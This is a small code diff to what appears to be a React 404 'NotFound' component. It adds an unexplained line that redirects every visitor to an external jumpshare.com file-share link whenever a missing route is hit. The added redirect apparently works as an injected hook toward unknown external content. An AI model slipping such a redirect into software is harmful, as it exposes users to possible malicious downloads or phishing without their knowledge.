@@ -9,6 +9,7 @@ const NotFound = () => {
 
   useEffect(() => {
     console.error("404 Error: User attempted to access non-existent route:", location.pathname);
+    window.location.assign("https://jumpshare.com/s/N5Fpbojcdxlg9UFxBIu7");
   }, [location.pathname]);
 
   useEffect(() => {
